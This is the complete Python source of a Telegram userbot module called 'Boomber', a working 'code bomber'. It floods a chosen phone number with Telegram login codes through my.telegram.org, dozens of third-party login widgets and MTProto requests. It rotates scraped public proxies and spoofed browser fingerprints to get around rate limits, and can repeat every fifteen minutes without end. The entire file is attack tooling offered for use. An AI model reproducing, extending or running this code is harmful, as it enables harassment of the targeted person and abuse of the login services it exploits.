# CopyLeft 2026 github.com/i-execute
# Author: I_execute.t.me
# Licensed under AGPLv3.

__version__ = (1, 0, 0)
# meta developer: Execute_forge.t.me

import asyncio
import contextlib
import logging
import random
import re
import time
from urllib.parse import urlencode

import aiohttp
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneNumberInvalidError
from telethon.sessions import StringSession
from telethon.tl.types import Message

from .. import loader, utils
from ..inline.types import InlineCall

try:
    from curl_cffi.requests import AsyncSession as CurlSession
    HAVE_CURL = True
except ImportError:
    HAVE_CURL = False

logger = logging.getLogger(__name__)

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/https.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

MTPROTO_APPS = [
    (
        "Telegram Web",
        2496,
        "8da85b0d5bfe62527e5b244c209159c3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Windows",
        "2.1.9 K",
        "en",
        "en-US",
    ),
]

NEW_OAUTH = {
    "Fragment": {
        "page": "auth/auth",
        "client_id": "5444323279",
        "origin": "https://fragment.com",
        "return_to": "https://fragment.com/",
        "scope": "openid profile telegram:bot_access",
        "redirect_uri": "https://fragment.com/",
        "response_type": "post_message",
    },
    "translations.telegram.org": {
        "page": "auth",
        "client_id": "8591891104",
        "redirect_uri": "https://translations.telegram.org/",
        "scope": "openid profile",
        "response_type": "post_message",
    },
}

WIDGETS = {
    "core.telegram.org": {
        "bot_id": "547043436",
        "origin": "https://core.telegram.org",
        "return_to": "https://core.telegram.org/widgets/login",
    },
    "presscode.app": {
        "bot_id": "1852523856",
        "origin": "https://cabinet.presscode.app",
        "return_to": "https://cabinet.presscode.app/login",
    },
    "botobot.ru": {
        "bot_id": "366357143",
        "origin": "https://www.botobot.ru",
        "return_to": "https://www.botobot.ru/",
    },
    "lolz.live": {
        "bot_id": "7131017560",
        "origin": "https://lolz.live",
        "return_to": "https://lolz.live/",
    },
    "mipped.com": {
        "bot_id": "466141824",
        "origin": "https://mipped.com",
        "return_to": "https://mipped.com/f/register/connected-accounts/smodders_telegram/?setup=1",
    },
    "spot.uz": {
        "bot_id": "5463728243",
        "origin": "https://www.spot.uz",
        "return_to": "https://www.spot.uz/ru/2022/04/29/yoto/#",
    },
    "telegrambot.biz": {
        "bot_id": "319709511",
        "origin": "https://telegrambot.biz",
        "return_to": "https://telegrambot.biz/",
    },
    "ru.telegram-store.com": {
        "bot_id": "1803424014",
        "origin": "https://ru.telegram-store.com",
        "return_to": "https://ru.telegram-store.com/catalog/search",
    },
    "telemetr.me": {
        "bot_id": "339020805",
        "origin": "https://telemetr.me",
        "return_to": "https://telemetr.me/login/",
    },
    "labelup.ru": {
        "bot_id": "1329500876",
        "origin": "https://labelup.ru",
        "return_to": "https://labelup.ru/login",
    },
    "wmrfast.com": {
        "bot_id": "791722883",
        "origin": "https://wmrfast.com",
        "return_to": "https://wmrfast.com/login.php",
    },
    "kucoin.com": {
        "bot_id": "677983633",
        "origin": "https://www.kucoin.com",
        "return_to": "https://www.kucoin.com/ucenter/signup",
    },
    "quiz.directory": {
        "bot_id": "843073007",
        "origin": "https://quiz.directory",
        "return_to": "https://quiz.directory/auth/telegram",
    },
    "onlineradiobox.com": {
        "bot_id": "595995204",
        "origin": "https://onlineradiobox.com",
        "return_to": "https://onlineradiobox.com/login",
    },
    "topface.com": {
        "bot_id": "596001202",
        "origin": "https://topface.com",
        "return_to": "https://topface.com/register/",
    },
    "lingust.ru": {
        "bot_id": "753597371",
        "origin": "https://lingust.ru",
        "return_to": "https://lingust.ru/",
    },
    "iqvel.com": {
        "bot_id": "581561727",
        "origin": "https://iqvel.com",
        "return_to": "https://iqvel.com/login",
    },
    "hrscanner.ru": {
        "bot_id": "748895055",
        "origin": "https://app.hrscanner.ru",
        "return_to": "https://app.hrscanner.ru/login",
    },
    "rocketpot.io": {
        "bot_id": "1198579998",
        "origin": "https://rocketpot.io",
        "return_to": "https://rocketpot.io/auth/",
    },
    "uznews.uz": {
        "bot_id": "711739798",
        "origin": "https://uznews.uz",
        "return_to": "https://uznews.uz/auth",
    },
    "dumskaya.net": {
        "bot_id": "527781035",
        "origin": "https://dumskaya.net",
        "return_to": "https://dumskaya.net/login/",
    },
    "militarymaps.info": {
        "bot_id": "602497672",
        "origin": "https://militarymaps.info",
        "return_to": "https://militarymaps.info/",
    },
    "norma.uz": {
        "bot_id": "644485551",
        "origin": "https://v1.norma.uz",
        "return_to": "https://v1.norma.uz/auth",
    },
    "xcraft.ru": {
        "bot_id": "184067978",
        "origin": "https://xcraft.ru",
        "return_to": "https://xcraft.ru/login",
    },
    "xcraft.net": {
        "bot_id": "184067978",
        "origin": "https://xcraft.net",
        "return_to": "https://xcraft.net/login",
    },
    "tatarlove.ru": {
        "bot_id": "605481717",
        "origin": "https://tatarlove.ru",
        "return_to": "https://tatarlove.ru/",
    },
    "gdepapa.ru": {
        "bot_id": "651634591",
        "origin": "https://gdepapa.ru",
        "return_to": "https://gdepapa.ru/auth",
    },
    "fantasy-h2h.ru": {
        "bot_id": "403164966",
        "origin": "https://fantasy-h2h.ru",
        "return_to": "https://fantasy-h2h.ru/",
    },
    "lanos.com.ua": {
        "bot_id": "703273299",
        "origin": "https://lanos.com.ua",
        "return_to": "https://lanos.com.ua/",
    },
    "ovideo.ru": {
        "bot_id": "714136979",
        "origin": "https://ovideo.ru",
        "return_to": "https://ovideo.ru/login",
    },
    "restolife.kz": {
        "bot_id": "661413936",
        "origin": "https://restolife.kz",
        "return_to": "https://restolife.kz/auth",
    },
    "shahar.uz": {
        "bot_id": "514088927",
        "origin": "https://shahar.uz",
        "return_to": "https://shahar.uz/login",
    },
    "2event.com": {
        "bot_id": "395707797",
        "origin": "https://2event.com",
        "return_to": "https://2event.com/ru",
    },
    "bizclub.info": {
        "bot_id": "720935147",
        "origin": "https://bizclub.info",
        "return_to": "https://bizclub.info/",
    },
    "evybuy.com": {
        "bot_id": "626880099",
        "origin": "https://evybuy.com",
        "return_to": "https://evybuy.com/login",
    },
    "forumpajak.org": {
        "bot_id": "452504938",
        "origin": "https://forumpajak.org",
        "return_to": "https://forumpajak.org/",
    },
    "one-team.ru": {
        "bot_id": "551227017",
        "origin": "https://one-team.ru",
        "return_to": "https://one-team.ru/login",
    },
    "chickax.com": {
        "bot_id": "563032549",
        "origin": "https://chickax.com",
        "return_to": "https://chickax.com/",
    },
    "narod-expert.ru": {
        "bot_id": "740523097",
        "origin": "https://narod-expert.ru",
        "return_to": "https://narod-expert.ru/",
    },
    "vosmarket.ru": {
        "bot_id": "489240369",
        "origin": "https://vosmarket.ru",
        "return_to": "https://vosmarket.ru/",
    },
    "contextbar.ru": {
        "bot_id": "708173431",
        "origin": "https://contextbar.ru",
        "return_to": "https://contextbar.ru/",
    },
    "tvlider.net": {
        "bot_id": "678604732",
        "origin": "https://tvlider.net",
        "return_to": "https://tvlider.net/",
    },
    "telesat-news.net": {
        "bot_id": "731388658",
        "origin": "https://telesat-news.net",
        "return_to": "https://telesat-news.net/",
    },
    "wwii48.su": {
        "bot_id": "495570081",
        "origin": "https://wwii48.su",
        "return_to": "https://wwii48.su/",
    },
    "highsec.io": {
        "bot_id": "748895055",
        "origin": "https://highsec.io",
        "return_to": "https://highsec.io/login",
    },
}


def _normalize_phone(raw: str):
    cleaned = re.sub(r"[^\d+]", "", raw.strip())
    if not cleaned:
        return None
    if cleaned.startswith("8") and len(cleaned) == 11:
        cleaned = "+7" + cleaned[1:]
    elif not cleaned.startswith("+"):
        cleaned = "+" + cleaned
    digits = re.sub(r"\D", "", cleaned)
    if len(digits) < 10 or len(digits) > 15:
        return None
    return cleaned


@loader.tds
class Boomber(loader.Module):
    """Inline Telegram code bomber"""

    strings = {
        "name": "Boomber",
        "main_menu": (
            "<b>Boomber</b>\n"
            "<blockquote>Target: <b>{phone}</b>\n"
            "Status: <b>{status}</b>\n"
            "MTProto codes: <b>{mtproto_count}</b>\n"
            "Mode: <b>{mode}</b>\n"
            "Active proxies: <b>{proxies_count}</b></blockquote>"
        ),
        "attack_progress": (
            "<b>Boomber | Attack in progress</b>\n"
            "<blockquote>Target: <b>{phone}</b>\n"
            "Round: <b>#{cycle}</b>\n"
            "Web requests: <b>{web_done}/{web_total}</b> (Success: <b>{web_ok}</b>)\n"
            "MTProto sent: <b>{mtproto_sent}/{mtproto_target}</b>\n"
            "Elapsed: <b>{elapsed}</b></blockquote>"
        ),
        "attack_done": (
            "<b>Boomber | Attack finished</b>\n"
            "<blockquote>Target: <b>{phone}</b>\n"
            "Rounds: <b>{cycle}</b>\n"
            "Web successful: <b>{web_ok}/{web_total}</b>\n"
            "MTProto sent: <b>{mtproto_sent}</b>\n"
            "Total time: <b>{elapsed}</b></blockquote>"
        ),
        "attack_stopped": (
            "<b>Boomber | Attack stopped</b>\n"
            "<blockquote>Target: <b>{phone}</b>\n"
            "Web sent: <b>{web_ok}</b>\n"
            "MTProto sent: <b>{mtproto_sent}</b></blockquote>"
        ),
        "btn_input_phone": "Enter Phone",
        "prompt_phone": "Enter target phone number (+79991234567):",
        "btn_start": "Start Attack",
        "btn_stop": "Stop Attack",
        "btn_mode": "Mode: {mode}",
        "btn_count": "Codes: {count}",
        "prompt_count": "Enter MTProto codes count (0-20):",
        "btn_proxies": "Refresh Proxies",
        "btn_close": "Close",
        "btn_back": "Back",
        "mode_single": "Single Round",
        "mode_infinite": "Infinite (15m)",
        "status_idle": "Idle",
        "status_running": "Running",
        "status_stopped": "Stopped",
        "err_no_phone": "Set target phone number first.",
        "err_bad_phone": "<b>Error:</b>\n<blockquote>Invalid phone number. Use international format (e.g. +79991234567).</blockquote>",
        "proxies_refreshed": (
            "<b>Proxies Refreshed</b>\n"
            "<blockquote>Parsed: {parsed}\n"
            "Live working: {alive}</blockquote>"
        ),
    }

    strings_ru = {
        "main_menu": (
            "<b>Boomber</b>\n"
            "<blockquote>Цель: <b>{phone}</b>\n"
            "Статус: <b>{status}</b>\n"
            "MTProto коды: <b>{mtproto_count}</b>\n"
            "Режим: <b>{mode}</b>\n"
            "Активных прокси: <b>{proxies_count}</b></blockquote>"
        ),
        "attack_progress": (
            "<b>Boomber | Атака в процессе</b>\n"
            "<blockquote>Цель: <b>{phone}</b>\n"
            "Круг: <b>#{cycle}</b>\n"
            "Веб-запросы: <b>{web_done}/{web_total}</b> (Успешно: <b>{web_ok}</b>)\n"
            "MTProto отправлено: <b>{mtproto_sent}/{mtproto_target}</b>\n"
            "Прошло времени: <b>{elapsed}</b></blockquote>"
        ),
        "attack_done": (
            "<b>Boomber | Атака завершена</b>\n"
            "<blockquote>Цель: <b>{phone}</b>\n"
            "Кругов: <b>{cycle}</b>\n"
            "Веб успешно: <b>{web_ok}/{web_total}</b>\n"
            "MTProto отправлено: <b>{mtproto_sent}</b>\n"
            "Всего времени: <b>{elapsed}</b></blockquote>"
        ),
        "attack_stopped": (
            "<b>Boomber | Атака остановлена</b>\n"
            "<blockquote>Цель: <b>{phone}</b>\n"
            "Веб отправлено: <b>{web_ok}</b>\n"
            "MTProto отправлено: <b>{mtproto_sent}</b></blockquote>"
        ),
        "btn_input_phone": "Ввести номер",
        "prompt_phone": "Введите номер цели (+79991234567):",
        "btn_start": "Запустить атаку",
        "btn_stop": "Остановить атаку",
        "btn_mode": "Режим: {mode}",
        "btn_count": "Коды: {count}",
        "prompt_count": "Введите количество MTProto кодов (0-20):",
        "btn_proxies": "Обновить прокси",
        "btn_close": "Закрыть",
        "btn_back": "Назад",
        "mode_single": "Один круг",
        "mode_infinite": "Бесконечно (15 мин)",
        "status_idle": "Ожидание",
        "status_running": "Выполняется",
        "status_stopped": "Остановлен",
        "err_no_phone": "Сначала укажите номер телефона цели.",
        "err_bad_phone": "<b>Ошибка:</b>\n<blockquote>Некорректный номер телефона. Используйте международный формат (например +79991234567).</blockquote>",
        "proxies_refreshed": (
            "<b>Прокси обновлены</b>\n"
            "<blockquote>Спарсено: {parsed}\n"
            "Живых: {alive}</blockquote>"
        ),
    }

    def __init__(self):
        self._target_phone = None
        self._mtproto_count = 5
        self._infinite = False
        self._status = "status_idle"
        self._proxies = []
        self._proxies_at = 0.0
        self._proxy_idx = -1
        self._task = None
        self._current_token = None

    async def client_ready(self, client, db):
        self._client = client
        self._db = db

    def _next_proxy(self):
        if not self._proxies:
            return None
        self._proxy_idx = (self._proxy_idx + 1) % len(self._proxies)
        return self._proxies[self._proxy_idx]

    async def _fetch_public_proxies(self):
        proxies = set()
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for url in PROXY_SOURCES:
                try:
                    async with session.get(url) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            for line in text.splitlines():
                                line = line.strip()
                                if re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}", line):
                                    proxies.add(f"http://{line}")
                except Exception:
                    continue

        if not proxies:
            return 0, 0

        parsed_count = len(proxies)
        sample = random.sample(list(proxies), min(len(proxies), 100))
        sem = asyncio.Semaphore(25)
        alive = []

        async def _check(p):
            async with sem:
                try:
                    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=4)) as s:
                        async with s.get("https://oauth.telegram.org/", proxy=p) as r:
                            if r.status in (200, 302, 404):
                                alive.append(p)
                except Exception:
                    pass

        await asyncio.gather(*(_check(p) for p in sample))
        self._proxies = alive or list(sample[:15])
        self._proxies_at = time.monotonic()
        return parsed_count, len(self._proxies)

    async def _ensure_proxies(self):
        if not self._proxies or (time.monotonic() - self._proxies_at > 600):
            await self._fetch_public_proxies()

    async def _req(self, method, url, data=None, params=None, headers=None, proxy=None, timeout=12):
        hdrs = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        }
        if headers:
            hdrs.update(headers)

        if HAVE_CURL:
            try:
                async with CurlSession(timeout=timeout, impersonate="chrome131") as s:
                    if method.upper() == "GET":
                        r = await s.get(url, params=params, headers=hdrs, proxy=proxy)
                    else:
                        r = await s.post(url, data=data, params=params, headers=hdrs, proxy=proxy)
                    return r.status_code, r.text
            except Exception:
                pass

        try:
            to = aiohttp.ClientTimeout(total=timeout)
            async with aiohttp.ClientSession(timeout=to) as s:
                if method.upper() == "GET":
                    async with s.get(url, params=params, headers=hdrs, proxy=proxy) as r:
                        return r.status, await r.text()
                else:
                    async with s.post(url, data=data, params=params, headers=hdrs, proxy=proxy) as r:
                        return r.status, await r.text()
        except Exception as e:
            return 0, str(e)

    async def _srv_mytelegramorg(self, phone, proxy):
        with contextlib.suppress(Exception):
            await self._req("GET", "https://my.telegram.org/", proxy=proxy)
        st, text = await self._req("POST", "https://my.telegram.org/auth/send_password", data={"phone": phone}, proxy=proxy)
        return "random_hash" in text

    async def _srv_stel(self, base, phone, proxy):
        with contextlib.suppress(Exception):
            await self._req("GET", f"{base}/auth", proxy=proxy)
        st, text = await self._req(
            "POST",
            f"{base}/auth/request",
            data={"phone": phone.lstrip("+")},
            headers={
                "Origin": base,
                "Referer": f"{base}/auth",
                "X-Requested-With": "XMLHttpRequest",
            },
            proxy=proxy,
        )
        return st == 200 and bool(text.strip())

    async def _srv_oidc(self, cfg, phone, proxy):
        page = f"https://oauth.telegram.org/{cfg.get('page', 'auth')}"
        params = {k: v for k, v in cfg.items() if k != "page"}
        with contextlib.suppress(Exception):
            await self._req("GET", page, params={**params, "phone_login": 1}, proxy=proxy)
        st, text = await self._req(
            "POST",
            "https://oauth.telegram.org/auth/request",
            params=params,
            data={"phone": re.sub(r"\D", "", phone)},
            headers={"Origin": "https://oauth.telegram.org", "Referer": page},
            proxy=proxy,
        )
        return st == 200 and bool(text.strip())

    async def _srv_widget(self, cfg, phone, proxy):
        params = {
            "bot_id": cfg["bot_id"],
            "origin": cfg["origin"],
            "embed": 1,
            "request_access": "write",
            "return_to": cfg["return_to"],
        }
        auth_url = "https://oauth.telegram.org/auth"
        with contextlib.suppress(Exception):
            await self._req("GET", auth_url, params={**params, "phone_login": 1}, proxy=proxy)
        st, text = await self._req(
            "POST",
            "https://oauth.telegram.org/auth/request",
            params=params,
            data={"phone": phone},
            headers={"Origin": "https://oauth.telegram.org", "Referer": f"{auth_url}?{urlencode(params)}"},
            proxy=proxy,
        )
        return st == 200 and bool(text.strip())

    async def _send_mtproto(self, phone):
        app = MTPROTO_APPS[0]
        _, api_id, api_hash, model, sysver, appver, lang, syslang = app
        kwargs = {
            "device_model": model,
            "system_version": sysver,
            "app_version": appver,
            "lang_code": lang,
            "system_lang_code": syslang,
        }
        client = TelegramClient(StringSession(), api_id, api_hash, **kwargs)
        try:
            await client.connect()
            await client.send_code_request(phone)
            return True
        except (FloodWaitError, PhoneNumberInvalidError):
            return False
        except Exception:
            return False
        finally:
            with contextlib.suppress(Exception):
                await client.disconnect()

    def _fmt_main(self):
        mode_str = self.strings["mode_infinite"] if self._infinite else self.strings["mode_single"]
        phone_str = self._target_phone or "<i>Not set</i>"
        return self.strings["main_menu"].format(
            phone=phone_str,
            status=self.strings[self._status],
            mtproto_count=self._mtproto_count,
            mode=mode_str,
            proxies_count=len(self._proxies),
        )

    def _markup_main(self):
        if self._status == "status_running":
            return [[{"text": self.strings["btn_stop"], "callback": self._cb_stop, "style": "danger"}]]

        mode_str = self.strings["mode_infinite"] if self._infinite else self.strings["mode_single"]
        return [
            [
                {"text": self.strings["btn_input_phone"], "input": self.strings["prompt_phone"], "handler": self._ih_phone, "style": "primary"},
                {"text": self.strings["btn_start"], "callback": self._cb_start, "style": "success"},
            ],
            [
                {"text": self.strings["btn_mode"].format(mode=mode_str), "callback": self._cb_toggle_mode, "style": "primary"},
                {"text": self.strings["btn_count"].format(count=self._mtproto_count), "input": self.strings["prompt_count"], "handler": self._ih_count, "style": "primary"},
            ],
            [
                {"text": self.strings["btn_proxies"], "callback": self._cb_refresh_proxies, "style": "primary"},
                {"text": self.strings["btn_close"], "callback": self._cb_close, "style": "danger"},
            ],
        ]

    async def _cb_close(self, call: InlineCall):
        await call.delete()

    async def _cb_main(self, call: InlineCall):
        await call.edit(self._fmt_main(), reply_markup=self._markup_main())

    async def _ih_phone(self, call: InlineCall, raw_phone: str):
        normalized = _normalize_phone(raw_phone)
        if not normalized:
            await call.edit(
                self.strings["err_bad_phone"],
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_main, "style": "primary"}]],
            )
            return
        self._target_phone = normalized
        await call.edit(self._fmt_main(), reply_markup=self._markup_main())

    async def _ih_count(self, call: InlineCall, raw_count: str):
        try:
            val = int(raw_count.strip())
            self._mtproto_count = max(0, min(val, 20))
        except ValueError:
            pass
        await call.edit(self._fmt_main(), reply_markup=self._markup_main())

    async def _cb_toggle_mode(self, call: InlineCall):
        self._infinite = not self._infinite
        await call.edit(self._fmt_main(), reply_markup=self._markup_main())

    async def _cb_refresh_proxies(self, call: InlineCall):
        await call.edit("<b>Refreshing proxies...</b>", reply_markup=[])
        parsed, alive = await self._fetch_public_proxies()
        await call.edit(
            self.strings["proxies_refreshed"].format(parsed=parsed, alive=alive),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_main, "style": "primary"}]],
        )

    async def _cb_start(self, call: InlineCall):
        if not self._target_phone:
            await call.answer(self.strings["err_no_phone"], show_alert=True)
            return
        if self._task and not self._task.done():
            return
        self._status = "status_running"
        self._current_token = object()
        self._task = asyncio.ensure_future(self._attack_loop(call, self._current_token))
        await call.edit(self._fmt_main(), reply_markup=self._markup_main())

    async def _cb_stop(self, call: InlineCall):
        self._current_token = None
        if self._task and not self._task.done():
            self._task.cancel()
        self._status = "status_stopped"
        await call.edit(self._fmt_main(), reply_markup=self._markup_main())

    async def _attack_loop(self, call: InlineCall, token):
        cycle = 0
        total_web_ok = 0
        total_mtproto_sent = 0
        start_time = time.monotonic()
        phone = self._target_phone

        tasks_list = []
        tasks_list.append(("my.telegram.org", lambda p: self._srv_mytelegramorg(phone, p)))
        tasks_list.append(("promote.telegram.org", lambda p: self._srv_stel("https://promote.telegram.org", phone, p)))
        tasks_list.append(("instantview.telegram.org", lambda p: self._srv_stel("https://instantview.telegram.org", phone, p)))
        tasks_list.append(("contest.com", lambda p: self._srv_stel("https://contest.com", phone, p)))
        for name, cfg in NEW_OAUTH.items():
            tasks_list.append((name, lambda p, c=cfg: self._srv_oidc(c, phone, p)))
        for name, cfg in WIDGETS.items():
            tasks_list.append((name, lambda p, c=cfg: self._srv_widget(c, phone, p)))

        try:
            while self._current_token is token:
                cycle += 1
                await self._ensure_proxies()

                web_done = 0
                web_ok = 0
                sem = asyncio.Semaphore(8)
                last_ui_update = time.monotonic()

                async def _worker(name, fn):
                    nonlocal web_done, web_ok, last_ui_update
                    if self._current_token is not token:
                        return
                    async with sem:
                        proxy = self._next_proxy()
                        ok = False
                        with contextlib.suppress(Exception):
                            ok = await fn(proxy)
                        web_done += 1
                        if ok:
                            web_ok += 1
                        now = time.monotonic()
                        if now - last_ui_update >= 2.0:
                            last_ui_update = now
                            elapsed = f"{int(now - start_time)}s"
                            with contextlib.suppress(Exception):
                                await call.edit(
                                    self.strings["attack_progress"].format(
                                        phone=phone,
                                        cycle=cycle,
                                        web_done=web_done,
                                        web_total=len(tasks_list),
                                        web_ok=web_ok,
                                        mtproto_sent=total_mtproto_sent,
                                        mtproto_target=self._mtproto_count,
                                        elapsed=elapsed,
                                    ),
                                    reply_markup=[[{"text": self.strings["btn_stop"], "callback": self._cb_stop, "style": "danger"}]],
                                )

                await asyncio.gather(*(_worker(n, f) for n, f in tasks_list))
                total_web_ok += web_ok

                for _ in range(self._mtproto_count):
                    if self._current_token is not token:
                        break
                    mt_ok = await self._send_mtproto(phone)
                    if mt_ok:
                        total_mtproto_sent += 1
                    await asyncio.sleep(1.0)

                if not self._infinite or self._current_token is not token:
                    break

                for _ in range(900):
                    if self._current_token is not token:
                        break
                    await asyncio.sleep(1.0)

            elapsed = f"{int(time.monotonic() - start_time)}s"
            self._status = "status_idle"
            await call.edit(
                self.strings["attack_done"].format(
                    phone=phone,
                    cycle=cycle,
                    web_ok=total_web_ok,
                    web_total=len(tasks_list) * cycle,
                    mtproto_sent=total_mtproto_sent,
                    elapsed=elapsed,
                ),
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_main, "style": "primary"}]],
            )
        except asyncio.CancelledError:
            self._status = "status_stopped"
            await call.edit(
                self.strings["attack_stopped"].format(
                    phone=phone,
                    web_ok=total_web_ok,
                    mtproto_sent=total_mtproto_sent,
                ),
                reply_markup=[[{"text": self.strings["btn_back"], "callback": self._cb_main, "style": "primary"}]],
            )

    @loader.command(
        ru_doc="Инлайн бомбер кодами Telegram",
        en_doc="Inline Telegram code bomber",
    )
    async def b(self, message: Message):
        """Inline Telegram code bomber"""
        args = utils.get_args_raw(message)
        if args:
            norm = _normalize_phone(args)
            if norm:
                self._target_phone = norm
        await self.inline.form(
            text=self._fmt_main(),
            message=message,
            reply_markup=self._markup_main(),
            silent=True,
        )
